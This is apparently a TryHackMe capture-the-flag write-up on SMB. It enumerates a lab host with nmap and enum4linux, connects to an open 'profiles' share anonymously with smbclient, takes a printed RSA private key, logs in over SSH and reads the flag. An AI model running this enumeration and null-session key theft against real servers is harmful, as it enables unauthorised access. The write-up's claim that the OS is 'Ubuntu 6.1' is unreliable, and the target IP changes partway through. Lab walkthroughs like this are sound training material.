## Understading SMB
---
### What is SMB?
**SMB - Sever Message Block Protocol -** was created by IBM in the 1980's, and it is a layer 7 (application layer) protcol, using a [client-server architecture](https://en.wikipedia.org/wiki/Client%E2%80%93server_model) used primarily for sharing access to files, printers, serial ports and other resources which might be made available through a network. Over the years it has been mutated, extended and adapted to meet evolving network requirements - these variants are also often called ***dialects***.

The SMB protocols enables an application, or the user of an application, to access files on a remote server, printers and mails slots to name a few. This allows the client application to read, write, read, move, create and update files on the remote server. 

It uses a request-response protocol to establish a connection. This means it exchanges request and response messages back and forth, before it can completely conneect the client with the server. This made the original implementations of SMB, like CIFS (Common Internet File System), particularly *chatty*, which led a lot of networks, particularly Wide Area ones, to be slowed down by a swarm of SMB messages flying back and forth between SMB client and server nodes. As such, by 2006, SMB 2.0 was released with Windows Vista and Windows Server 2008 - which reduced chattiness, improved perfomrmance, enhanced security and resiliency and added support for Wide Area Networks 

*As a curiosity: You might have heard about the WannaCry and Petya ransomware attacks that plagued hundreds of thousands of computers back in 2017, but did you know that it was precisely a vulnerability in SMB 1.0 that hackers exploited to load the malware on vulnerable clients, effectively giving it a self-replicating platform across network hosts. As a result Microsoft has advised all users and administrators to disable SMB 1.0/CIFS on all of their systems, despite the fact that they have since patched the vulnerability.* 

--- 
### Enumerating SMB

If you're not sure what enumeration is, in the context of cyber security, make sure you first read the following quick explanation:

The reason we chose to introduce and talk about SMB has to do with fact that SMB share drives are a typical weak point when we begin enumerating targets. In practice, we have seen they are used by servers to view, cater and transfer files and share certain folders among users in a network. This means often you'll find sensitive information lying around in these shared drives. 

Our target in this task has the following IP address:

    MACHINE_IP = 10.10.228.27;

### Port Scanning

As usual, we begin by doing a port scanning on the target, to try and figure what kinds of services, applications, structure and possibly operating systems are being used by our target machine. To do this we make use of [Nmap](https://nmap.org/). In particular, in the spirit of our learning path, we want to explore if any port is running an SMB application. As such, we run the following command:

    diogo@kali ~:$ nmap -sV -oA Port_Scanning 10.10.228.27

If you don't understand the command we have just used, make sure you learn some of the basics of`nmap` [here](). 
  - The `-sV` switch tells `nmap` that we want to know which services and service versions are running on the open ports. 
  - The `-oA Port_Scanning` tells `nmap` that we want to store the output of the command in all possible formats, with the name "Port_Scanning". The included formats are:
    - Normal text
    - XML (Extensible Markup Language)
    - Greppable format 
    - S|<rIpt KIddi3
    
The output is as follows:

    diogo@kali ~:$ nmap -sV -oA Port_Scanning 10.10.228.27
    
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-23 12:33 BST
    Nmap scan report for 10.10.228.27
    Host is up (0.048s latency).
    Not shown: 997 closed ports
    PORT    STATE SERVICE     VERSION
    22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    Service Info: Host: POLOSMB; OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 12.45 seconds

Looking at the report, we can see that the target has, at least, 3 open ports. 
  - Port 22, which is listening for SSH (Secure Shell) connections and is running **OpenSSH version 7.6p1**
  - Ports 139 and 445, both listening for **netbios-ssn** connections and running the software Samba and the service smbd, which is used to implement the SMB protocol. Moreover, `nmap` is only able to tell us that the verison is somewhere between 3.X and 4.X.   
  
So, at this point we know that our target machine is running SMB on ports 139 and 445, and we know the protocol is being implemented via the Samba suite. To gain additional information on these SMB shares, we can use a tool called [Enum4Linux](https://github.com/CiscoCXSecurity/enum4linux), which was created precisely with the intent of doing enumeration of targets using Windows and Samba. (If you're using either Kali Linux or Parrot, then Enum4Linux should already come pre-installed, if not then you can always download it from the GitHub page)

We run the following command:

    diogo@kali ~ :$ enum4linux -a 10.10.228.27
    
Which is used to get a full, basic enumeration of the target (see the documentation for additional details on the optional commands). We get the following output:

    Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Aug 23 13:07:30 2021
    
     ========================== 
    |    Target Information    |
     ========================== 
    Target ........... 10.10.228.27
    RID Range ........ 500-550,1000-1050
    Username ......... ''
    Password ......... ''
    Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
    
    
     ==================================================== 
    |    Enumerating Workgroup/Domain on 10.10.228.27    |
     ==================================================== 
    [+] Got domain/workgroup name: WORKGROUP
    
     ============================================ 
    |    Nbtstat Information for 10.10.228.27    |
     ============================================ 
    Looking up status of 10.10.228.27
            POLOSMB         <00> -         B <ACTIVE>  Workstation Service
            POLOSMB         <03> -         B <ACTIVE>  Messenger Service
            POLOSMB         <20> -         B <ACTIVE>  File Server Service
            ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
            WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
            WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
            WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
    
            MAC Address = 00-00-00-00-00-00
    
     ===================================== 
    |    Session Check on 10.10.228.27    |
     ===================================== 
    [+] Server 10.10.228.27 allows sessions using username '', password ''
    
     =========================================== 
    |    Getting domain SID for 10.10.228.27    |
     =========================================== 
    Domain Name: WORKGROUP
    Domain Sid: (NULL SID)
    [+] Can't determine if host is part of domain or part of a workgroup
    
     ====================================== 
    |    OS information on 10.10.228.27    |
     ====================================== 
    Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
    [+] Got OS info for 10.10.228.27 from smbclient: 
    [+] Got OS info for 10.10.228.27 from srvinfo:
            POLOSMB        Wk Sv PrQ Unx NT SNT polosmb server (Samba, Ubuntu)
            platform_id     :       500
            os version      :       6.1
            server type     :       0x809a03
    
     ============================= 
    |    Users on 10.10.228.27    |
     ============================= 
    Use of uninitialized value $users in print at ./enum4linux.pl line 874.
    Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.
    
    Use of uninitialized value $users in print at ./enum4linux.pl line 888.
    Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.
    
     ========================================= 
    |    Share Enumeration on 10.10.228.27    |
     ========================================= 
    
            Sharename       Type      Comment
            ---------       ----      -------
            netlogon        Disk      Network Logon Service
            profiles        Disk      Users profiles
            print$          Disk      Printer Drivers
            IPC$            IPC       IPC Service (polosmb server (Samba, Ubuntu))
    SMB1 disabled -- no workgroup available
    
    [+] Attempting to map shares on 10.10.228.27
    //10.10.228.27/netlogon [E] Can't understand response:
    tree connect failed: NT_STATUS_BAD_NETWORK_NAME
    //10.10.228.27/profiles Mapping: OK, Listing: OK
    //10.10.228.27/print$   Mapping: DENIED, Listing: N/A
    //10.10.228.27/IPC$     [E] Can't understand response:
    NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
    
     ==================================================== 
    |    Password Policy Information for 10.10.228.27    |
     ==================================================== 
    
    
    [+] Attaching to 10.10.228.27 using a NULL share
    
    [+] Trying protocol 139/SMB...
    
    [+] Found domain(s):
    
            [+] POLOSMB
            [+] Builtin
    
    [+] Password Info for Domain: POLOSMB
    
            [+] Minimum password length: 5
            [+] Password history length: None
            [+] Maximum password age: 37 days 6 hours 21 minutes 
            [+] Password Complexity Flags: 000000
    
                    [+] Domain Refuse Password Change: 0
                    [+] Domain Password Store Cleartext: 0
                    [+] Domain Password Lockout Admins: 0
                    [+] Domain Password No Clear Change: 0
                    [+] Domain Password No Anon Change: 0
                    [+] Domain Password Complex: 0
    
            [+] Minimum password age: None
            [+] Reset Account Lockout Counter: 30 minutes 
            [+] Locked Account Duration: 30 minutes 
            [+] Account Lockout Threshold: None
            [+] Forced Log off Time: 37 days 6 hours 21 minutes 
    
    
    [+] Retieved partial password policy with rpcclient:
    
    Password Complexity: Disabled
    Minimum Password Length: 5
    
    
     ============================== 
    |    Groups on 10.10.228.27    |
     ============================== 
    
    [+] Getting builtin groups:
    
    [+] Getting builtin group memberships:
    
    [+] Getting local groups:
    
    [+] Getting local group memberships:
    
    [+] Getting domain groups:
    
    [+] Getting domain group memberships:
    
... (here we omit an unnecessary and lengthy part of the report) 
   
     ============================================= 
    |    Getting printer info for 10.10.228.27    |
     ============================================= 
    No printers returned.
    
    
    enum4linux complete on Mon Aug 23 13:11:20 2021



I would definitely recommend taking a closer look at this report. It includes a lot of useful information if you're attempting to break in to this machine's network. For example, from the ` Enumerating Workgroup/Domain` section, we can extract the name of the workgroup to which our target belongs, it's the workgroup called WORKGROUP (creative guys down at TryHackMe!). 

This is really valuable information if you're a hacker - collecting and storing workgroup data is an obligatory step while executing an effective reconnaissance strategy. 

While doing reconnaissance, it is also of utmost importance to check out which OS is being used by the target, and in particular to know the flavor and version of the OS being used. Herein lies one of the secrets to a successful hacking campaign, as often the target machines are running on software known to be exploitable and possibly unpatched.

Looking at the `OS information` section, we can answer the question about which version of OS the target using. In this case the answer is Ubuntu 6.1. 
    
     ====================================== 
    |    OS information on 10.10.228.27    |
     ====================================== 
    Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
    [+] Got OS info for 10.10.228.27 from smbclient: 
    [+] Got OS info for 10.10.228.27 from srvinfo:
            POLOSMB        Wk Sv PrQ Unx NT SNT polosmb server (Samba, Ubuntu)
            platform_id     :       500
            os version      :       6.1
            server type     :       0x809a03

In the case of SMB exploits, a useful tool to have, is access to the SMB shares' names. It is frequent for people to name SMB shares in very revealing ways like 'confidential', 'private' or 'sensitive',  which can immediately alert the hacker to a potentially useful folder. 

In our case, this enumeration is performed by `Enum4Linux` under the `Share Enumeration` section. We can see that there are 4 shares:

     ========================================= 
    |    Share Enumeration on 10.10.228.27    |
     ========================================= 
    
            Sharename       Type      Comment
            ---------       ----      -------
            netlogon        Disk      Network Logon Service
            profiles        Disk      Users profiles
            print$          Disk      Printer Drivers
            IPC$            IPC       IPC Service (polosmb server (Samba, Ubuntu))
    SMB1 disabled -- no workgroup available
And that there is a potentially interesting share named `profiles`, which can be used to enumerate the Users Profiles, and hence completing another step in enumerating our target's network.


### Exploiting SMB

We now turn to exploiting our target. At this point we are focused on gaining access to the ``profiles`` share. There are some known CVE's related to SMB protocols that we could try and lookup, but before we do that, notice the presence of a Share named `IPC$` (Google it first). This share is used to give access to *null sessions* i.e. connections via anonymous users, or users that do not require username or password. Sometimes SMB shares are misconfigured and they're inadvertently given a *null session* configuration, rendering them accessible to any SMB client that wants to know more than he probably should.  

To test if this is the case we can use Linux's built-in SMB client called `smbclient`. The syntax is pretty straightforward - if we want access to a share named [SHARE], then the syntax is as follows:

    diogo@kali ~ :$ smbclient //<TARGET_IP>/[SHARE] -U <username> -p <port>
    
Let us try to access the `profiles` share in our target's machine using an empty username, ' ', listening on port 139.

    diogo@kali ~ :$ smbclient //10.10.253.213/profiles -U  -p 139
    
We get back the following output 

    diogo@kali ~ :$ smbclient //10.10.253.213/profiles -U  -p 139
    
    Try "help" to get a list of possible commands.
    smb: \>
    
Uhuh! This means we were able to get an SMB connection to our target! Now we can do a lot of damage, let's start by locating ourselves by running the `pwd` command.

    diogo@kali ~ :$ smbclient //10.10.253.213/profiles -U  -p 139
    
    Try "help" to get a list of possible commands.
    smb: \> pwd
    Current directory is \\10.10.253.213\profiles\
    smb: \> 
    
Okay, that's good! Let us now list the contents of this directory using `ls`.

    smb:  \> ls 
          .                                   D        0  Tue Apr 21 12:08:23 2020
          ..                                  D        0  Tue Apr 21 11:49:56 2020
          .cache                             DH        0  Tue Apr 21 12:08:23 2020
          .profile                            H      807  Tue Apr 21 12:08:23 2020
          .sudo_as_admin_successful           H        0  Tue Apr 21 12:08:23 2020
          .bash_logout                        H      220  Tue Apr 21 12:08:23 2020
          .viminfo                            H      947  Tue Apr 21 12:08:23 2020
          Working From Home Information.txt      N      358  Tue Apr 21 12:08:23 2020
          .ssh                               DH        0  Tue Apr 21 12:08:23 2020
          .bashrc                             H     3771  Tue Apr 21 12:08:23 2020
          .gnupg                             DH        0  Tue Apr 21 12:08:23 2020
        
                        12316808 blocks of size 1024. 7567352 blocks available
    smb: \>

Nicee work! We immediately spot an interesting looking file named ``Working From Home Information.txt``. So we fetch it by typing in:

     smb:  \> get "Working From Home Information.txt"

And we get back the following message
    
    smb:  \> get "Working From Home Information.txt"
    getting file \Working From Home Information.txt of size 358 as Working From Home Information.txt (1.8 KiloBytes/sec) (average 1.8 KiloBytes/sec)
    smb: \> 
    
Now, if we go and look at our working directory we will see the file "Working From Home Information.txt". We open it and get the following content:

    diogo@kali ~ :$ cat "Working From Home Information.txt"
    
    John Cactus,

    As you're well aware, due to the current pandemic most of POLO inc. has insisted that, wherever 
    possible, employees should work from home. As such- your account has now been enabled with ssh
    access to the main server.
    
    If there are any problems, please contact the IT department at it@polointernalcoms.uk
    
    Regards,
    
    James
    Department Manager 

This is interesting... First thing we notice is that the name of our user is John Cactus, which might be a helpful tip. Moreover, we know that John was told that he had access to the main server via SSH. This is a hint that we should look for SSH credentials.

Recall that when we listed the ``profiles`` share we found a folder called ``.ssh``. If we download that folder we obtain the following:

    smb: \> cd .ssh
    smb: \.ssh\> ls 
      .                                   D        0  Tue Apr 21 12:08:23 2020
      ..                                  D        0  Tue Apr 21 12:08:23 2020
      id_rsa                              A     1679  Tue Apr 21 12:08:23 2020
      id_rsa.pub                          N      396  Tue Apr 21 12:08:23 2020
      authorized_keys                     N        0  Tue Apr 21 12:08:23 2020
    
                    12316808 blocks of size 1024. 7506728 blocks available
    smb: \.ssh\>
    
We download the `id_rsa` and the ``id_rsa.pub`` since they are the only ones we are allowed access to. When we open them we get the following:

    diogo@kali ~ :$ cat id_rsa
    
    -----BEGIN RSA PRIVATE KEY-----
    MIIEpAIBAAKCAQEA2+zmi/My2eWfDlN8GT0iEB2qMiPGHNyP/P2On2loGE2W3zT3
    sZYtI8XQHk3hstl91wAlnAeBxXo24jbDGC48ude4MFijwbzfOuYvLiENBqmsqvyp
    gR6bgW0dMl/0qcn8r80d1Q9eqYPw/lk/IS2jR0mJuhTWC7JlZ1g0iQwYUte/XM37
    bqFueZsPzqs1la+ZZ/XCnnrl5TVdZagowahdwpcxAbzeCVvBkv64i03h3F3jCDFE
    7iKa+F6Lzf1YryJS6k2Mu5R7lIei9kagH8OfhUq+EGVtcxwjKEuhaKE6Jqv9NxBi
    QhnKfNP309HtOJ/u/j8Z5r2UJDsHtQNYVBugvwIDAQABAoIBABgca9YyDoQnEX4P
    lw5pTl+38N3YYDLv13VkEwvVEY2AjCbidrlofoBqgnugDDuAbrRwlq75f7e3w2af
    nFn9T7kMNmxOe32VCGA7tjZ3dycg2QZR9v9p7KCO5uGL9ZXbyDE56qheLAGnrnck
    L7CigUEihc/50tGreESRPgk8YzpJquLS8G00h5GQPnKnboawTI9S+lkKzIuLpLBX
    +Bn7lK1jacpnNjA1qkzg6yc7wlfxY9CPhIeuWZTwDAk5fHpPPVUoYRqRPJtAki3s
    8mU2bbEtBj/6JqKWljhXkYMgBy6Ua9qaKoRb/FAMivg9VPp13330DIurHsSPHRum
    008tKakCgYEA+IXJwrav+Bc3CG6Quc+hl/x7lnfHBmsK3jZP3YJ013/02r1ESyrJ
    5+OTp5V7O4eRbdWWAFOHWUAN8m2/JM3hwmNJecrYcFLE4wFrFW3dIRanMuomakN4
    snbiDGLhJ4EePXCEaoI0bD9/KUnoqkQpIR26TcZ2m+3WaBnISP98d5UCgYEA4orY
    oyzYmdUpNCFK3MDuJMcrTMBwnl6L1DvT15gk/+bG/mAVgHgsyT2SwbbVH43sNmt1
    tgGm7xWSOulmJ3ztxhCXwAghlSmP0coPzJq2LuusgdB4kYAwgV7LZB0aqx7aBFyw
    oGb7U+fcTmLZpd7gspc+n+JLFkuh9EVmovHW0gMCgYEA8x117Svn4qtbI719iLfM
    HbFZeS29HdMzM4QwBsJq6LF850rFdz7pexZOyF7bybVqF+ccMT+FJVMbEbA4j5l0
    I0QbibBcoSzm/CbUCYeLDaZqc81JPSS5+uN/aJyGI64U1gevEb5D6C0JiWuK1p2N
    Gp9JNHJUb19wIjAulPKRYS0CgYBcUX61CGqATfiLkOGkEk8515xSm72JHDhZVcQf
    gJXbXt1K/jbk8pQ1sgzjOjGhuUFAcAw5DnVLyvubXE/P2b4/z7U3gVjGI3jDYleL
    5qRFfK8A+8aWbKnXnpy+AIpEn77yth8YTr8u0zbZDrlpOelRfgb8Osiknk+ybrHD
    x0/mpwKBgQCsrvJXtzUQwKsskWpYdOKp5sB0BUNCK4nC4T8T4aqGQaa2X87fmGU1
    R8KXJ1nCfENH+hCza0ZDxUX7Pf2SWGLlminvZHxvl/BUZanpYaJJGCKSNM05tDsh
    71DetLqdn48jtdav/U5i+/lSIQ9fW17JNPtkDD26fAmWg40za1Z51g==
    -----END RSA PRIVATE KEY-----
    
    diogo@kali ~ :$ cat id_rsa.pub
    
    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDb7OaL8zLZ5Z8OU3wZPSIQHaoyI8Yc3I/8/Y6faWgYTZbfNPexli0jxdAeTeGy2X3XACWcB4HFejbiNsMYLjy517gwWKPBvN865i8uIQ0Gqayq/KmBHpuBbR0yX/SpyfyvzR3VD16pg/D+WT8hLaNHSYm6FNYLsmVnWDSJDBhS179czftuoW55mw/OqzWVr5ln9cKeeuXlNV1lqCjBqF3ClzEBvN4JW8GS/riLTeHcXeMIMUTuIpr4XovN/VivIlLqTYy7lHuUh6L2RqAfw5+FSr4QZW1zHCMoS6FooTomq/03EGJCGcp80/fT0e04n+7+PxnmvZQkOwe1A1hUG6C/ cactus@polosmb

This is all we need! We have managed to obtain John Cactus's username - **cactus** - since in the end of the `id_rsa.pub` file we can read that his handle is ``cactus@polosmb``. Besides that, we also have access to his RSA private-key. All we are left to do now is to try and connect to the main server via SSH. That is achieved using the following command:

    diogo@kali ~ :$ ssh cactus@10.10.253.213 -i id_rsa
    
    The authenticity of host '10.10.253.213 (10.10.78.209)' can't be established.
    ECDSA key fingerprint is SHA256:RZt+npRH1P+pLVe+/9mqAkepvpb20f+TzqgPAhYhHss.
    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
    Warning: Permanently added '10.10.253.213' (ECDSA) to the list of known hosts.
    Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-96-generic x86_64)
    
     * Documentation:  https://help.ubuntu.com
     * Management:     https://landscape.canonical.com
     * Support:        https://ubuntu.com/advantage
    
      System information as of Mon Aug 23 22:38:43 UTC 2021
    
      System load:  0.08               Processes:           92
      Usage of /:   33.3% of 11.75GB   Users logged in:     0
      Memory usage: 17%                IP address for eth0: 10.10.78.209
      Swap usage:   0%
    
    
    22 packages can be updated.
    0 updates are security updates.
    
    
    Last login: Tue Apr 21 11:19:15 2020 from 192.168.1.110

    cactus@polosmb:~$ 
    
That's it! We got a shell running in the main server. If we list the current directory, we see that there is a file called `smb.txt` that looks particularly suspicious

    cactus@polosmb:~$ ls
    smb.txt
And if we look inside it is precisely the flag that we were looking for. 

    cactus@polosmb:~$ cat smb.txt
    THM{smb_is_fun_eh?}

Concluding our SMB enumeration and exploitation rundown. Hope you enjoyed it and found the experience somewhat enriching. Try Hack Me is a great tool! Next up, we'll talk about [Telnet](https://en.wikipedia.org/wiki/Telnet), another infamous Network service.
